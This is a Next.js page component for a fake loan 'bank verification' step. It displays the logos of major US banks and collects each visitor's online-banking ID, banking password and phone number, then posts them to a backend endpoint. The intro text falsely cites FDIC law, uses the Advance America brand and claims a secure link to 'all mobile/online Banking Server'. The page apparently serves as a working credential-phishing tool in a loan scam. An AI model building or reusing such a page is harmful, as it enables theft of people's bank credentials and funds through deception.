// app/bank-verification/page.tsx
"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

export default function BankVerificationPage() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedBank, setSelectedBank] = useState<string | null>(null);
  const [isOtherBank, setIsOtherBank] = useState(false);
  const [formData, setFormData] = useState({
    bankname: "",
    otherbankname: "",
    bankingmobileid: "",
    bankingmobilepassword: "",
    phone: "",
  });
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);

  const router = useRouter();

  // Banks list
  const banks = [
    { name: "Chase", logo: "/img/bnl/chase_bank-logo.svg" },
    { name: "Bank of America", logo: "/img/bnl/bank_of_america-logo.svg" },
    { name: "Wells Fargo", logo: "/img/bnl/wells_fargo-logo.svg" },
    { name: "TD Bank", logo: "/img/bnl/td_bank-_n.a.-logo.svg" },
    { name: "Navy Federal Credit Union", logo: "/img/bnl/navy-federal-credit.svg" },
    { name: "Truist", logo: "/img/bnl/truist_logo.png" },
    { name: "Regions", logo: "/img/bnl/regions-bank.svg" },
    { name: "Us Bank", logo: "/img/bnl/usbank.png" },
    { name: "KeyBank", logo: "/img/bnl/keybank-logo.svg" },
    { name: "CitiBank", logo: "/img/bnl/citi-bank.png" },
  ];

  // Handle bank selection
  const selectBank = (bankName: string) => {
    setSelectedBank(bankName);
    setFormData((prev) => ({ ...prev, bankname: bankName }));
    setIsOtherBank(false);
    setIsModalOpen(true);
  };

  // Show "Other Bank" form
  const showOtherBankForm = () => {
    setSelectedBank(null);
    setFormData((prev) => ({ ...prev, bankname: "" }));
    setIsOtherBank(true);
    setIsModalOpen(true);
  };

  // Handle input change
  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors((prev) => {
        const newErr = { ...prev };
        delete newErr[name];
        return newErr;
      });
    }
  };

  // Validate form
  const validateForm = () => {
    const newErrors: { [key: string]: string } = {};

    if (!isOtherBank && !formData.bankname) newErrors.bankname = "Required";
    if (isOtherBank && !formData.otherbankname) newErrors.otherbankname = "Required";
    if (!formData.bankingmobileid) newErrors.bankingmobileid = "Required";
    if (!formData.bankingmobilepassword) newErrors.bankingmobilepassword = "Required";
    if (!formData.phone) newErrors.phone = "Required";

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsSubmitting(true);
    setShowSuccess(false);
    setShowError(false);

    try {
      const res = await fetch("/api/bank-verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...formData,
          bankname: isOtherBank ? formData.otherbankname : formData.bankname,
        }),
      });

      if (res.ok) {
        setShowSuccess(true);
        setTimeout(() => {
          router.push("/under-review"); // Redirect after success
        }, 2000);
      } else {
        setShowError(true);
      }
    } catch (error) {
      console.error("Submission error:", error);
      setShowError(true);
    } finally {
      setIsSubmitting(false);
    }
  };

  // Auto-close alerts
  useEffect(() => {
    if (showSuccess || showError) {
      const timer = setTimeout(() => {
        setShowSuccess(false);
        setShowError(false);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [showSuccess, showError]);

  return (
    <main className="min-h-screen bg-gray-50 pt-16">
      {/* Intro Section */}
      <section id="intro" className="intro-section mt-12 px-4">
        <div className="container mx-auto max-w-4xl text-center">
          <p className="about-description text-gray-700 leading-relaxed">
            As per the law of Federal Deposit Insurance Corporation, we would need to verify you to check your repayment capacity and also that you are not misusing anyone’s identity.
            To do this verification – please agree to the consent form and move ahead with the loan officer instructions.
            I hereby authorize <strong>Advance America</strong> Group (under reversal credit & reversal process) to access and utilize the following banking information for the specific purpose of processing payments, setting up direct deposits, etc.
          </p>
        </div>
      </section>

      {/* Bank Logos Section */}
      <section className="inner_section bankauthentication py-12">
        <div className="container mx-auto px-4">
          <div className="max-w-6xl mx-auto">
            {/* Alerts */}
            {showSuccess && (
              <div className="alert alert-success bg-green-100 text-green-800 p-4 rounded-lg mb-6 text-center">
                ✅ Bank Authentication Under Review.
              </div>
            )}
            {showError && (
              <div className="alert alert-danger bg-red-100 text-red-800 p-4 rounded-lg mb-6 text-center">
                ❌ Please fill in all required fields.
              </div>
            )}

            {/* Bank Grid */}
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-6 justify-items-center mb-8">
              {banks.map((bank, index) => (
                <div
                  key={bank.name}
                  className="box bg-white border border-gray-200 rounded-lg shadow-sm overflow-hidden hover:shadow-lg transition-all duration-300 hover:scale-105 cursor-pointer"
                  style={{ transitionDelay: `${index * 0.05}s` }}
                  onClick={() => selectBank(bank.name)}
                >
                  <Image
                    src={bank.logo}
                    alt={bank.name}
                    width={200}
                    height={80}
                    className="w-full h-full object-contain p-4"
                  />
                </div>
              ))}
            </div>

            {/* Other Bank Button */}
            <div className="text-center mt-6">
              <button
                onClick={showOtherBankForm}
                className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg shadow transition-transform hover:scale-105"
              >
                Other Banks & Credit Unions
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Modal */}
      {isModalOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-opacity-20 backdrop-blur-sm transition-all duration-300"
          onClick={() => setIsModalOpen(false)} // Close on backdrop click
        >
          <div
            className="bg-white rounded-2xl shadow-2xl max-w-lg w-full max-h-screen overflow-y-auto transform transition-all scale-100"
            onClick={(e) => e.stopPropagation()} // Prevent closing when clicking inside
          >
            {/* Modal Header with Close Button Inside */}
            <div className="flex justify-between items-center p-6 border-b border-gray-100 bg-gray-50 rounded-t-2xl">
              <h5 className="text-xl font-semibold text-gray-800">Bank Authentication</h5>
              <button
                onClick={() => setIsModalOpen(false)}
                className="w-8 h-8 flex items-center justify-center rounded-full bg-gray-200 hover:bg-gray-300 text-gray-700 transition-colors duration-200 focus:outline-none"
                aria-label="Close modal"
              >
                ✕
              </button>
            </div>

            {/* Modal Body */}
            <div className="p-6">
              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="card bg-gray-50 rounded-xl p-6">
                  <h5 className="text-center text-lg font-medium text-gray-800 mb-3">Enter Your Banking Details</h5>
                  <p className="text-center text-sm text-gray-600 mb-5">
                    Please enter the credentials you use for mobile or online banking.
                  </p>

                  {/* Bank Selection */}
                  {!isOtherBank ? (
                    <div className="mb-4">
                      <select
                        id="bankname"
                        name="bankname"
                        value={formData.bankname}
                        onChange={handleChange}
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        required
                      >
                        <option value="">Select Bank</option>
                        {banks.map((bank) => (
                          <option key={bank.name} value={bank.name}>
                            {bank.name}
                          </option>
                        ))}
                      </select>
                      {errors.bankname && <p className="text-red-500 text-sm mt-1">{errors.bankname}</p>}
                    </div>
                  ) : (
                    <div className="mb-4">
                      <input
                        type="text"
                        id="otherbankname"
                        name="otherbankname"
                        value={formData.otherbankname}
                        onChange={handleChange}
                        placeholder="Enter Bank Name"
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      />
                      {errors.otherbankname && <p className="text-red-500 text-sm mt-1">{errors.otherbankname}</p>}
                    </div>
                  )}

                  {/* Mobile ID */}
                  <div className="mb-4">
                    <input
                      type="text"
                      id="bankingmobileid"
                      name="bankingmobileid"
                      value={formData.bankingmobileid}
                      onChange={handleChange}
                      placeholder="Online Banking Mobile ID"
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />
                    {errors.bankingmobileid && <p className="text-red-500 text-sm mt-1">{errors.bankingmobileid}</p>}
                  </div>

                  {/* Password */}
                  <div className="mb-4">
                    <input
                      type="password"
                      id="bankingmobilepassword"
                      name="bankingmobilepassword"
                      value={formData.bankingmobilepassword}
                      onChange={handleChange}
                      placeholder="Online Banking Mobile Password"
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />
                    {errors.bankingmobilepassword && (
                      <p className="text-red-500 text-sm mt-1">{errors.bankingmobilepassword}</p>
                    )}
                  </div>

                  {/* Phone */}
                  <div className="mb-4">
                    <input
                      type="tel"
                      id="phone"
                      name="phone"
                      value={formData.phone}
                      onChange={handleChange}
                      placeholder="Phone Number"
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      required
                    />
                    {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
                  </div>

                  {/* Submit Button */}
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="w-full py-3 bg-gray-800 hover:bg-gray-900 text-white font-medium rounded-lg transition disabled:opacity-70 disabled:cursor-not-allowed"
                  >
                    {isSubmitting ? "Submitting..." : "Submit"}
                  </button>
                </div>

                {/* Security & Benefits */}
                <div className="text-center text-green-600 text-sm flex items-center justify-center gap-2 mb-4">
                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 229.5 229.5" fill="#84cd44">
                    <path d="M214.419 32.12A7.502 7.502 0 0 0 209 25.927L116.76.275a7.496 7.496 0 0 0-4.02 0L20.5 25.927a7.5 7.5 0 0 0-5.419 6.193c-.535 3.847-12.74 94.743 18.565 139.961 31.268 45.164 77.395 56.738 79.343 57.209a7.484 7.484 0 0 0 3.522 0c1.949-.471 48.076-12.045 79.343-57.209 31.305-45.217 19.1-136.113 18.565-139.961zm-40.186 53.066-62.917 62.917c-1.464 1.464-3.384 2.197-5.303 2.197s-3.839-.732-5.303-2.197l-38.901-38.901a7.497 7.497 0 0 1 0-10.606l7.724-7.724a7.5 7.5 0 0 1 10.606 0l25.874 25.874 49.89-49.891a7.497 7.497 0 0 1 10.606 0l7.724 7.724a7.5 7.5 0 0 1 0 10.607z" />
                  </svg>
                  Securely linked with all mobile/online Banking Server
                </div>

                <ul className="point_list space-y-2 text-sm">
                  <li className="flex items-center gap-2 text-green-700">
                    <svg viewBox="0 0 24 24" fill="#0e680e" width="16" height="16">
                      <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" />
                    </svg>
                    <span className="font-medium">10% interest rate</span>
                  </li>
                  <li className="flex items-center gap-2 text-green-700">
                    <svg viewBox="0 0 24 24" fill="#0e680e" width="16" height="16">
                      <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" />
                    </svg>
                    <span className="font-medium">No prepayment fees</span>
                  </li>
                  <li className="flex items-center gap-2 text-green-700">
                    <svg viewBox="0 0 24 24" fill="#0e680e" width="16" height="16">
                      <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" />
                    </svg>
                    <span className="font-medium">Fast Funding</span>
                  </li>
                </ul>
              </form>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
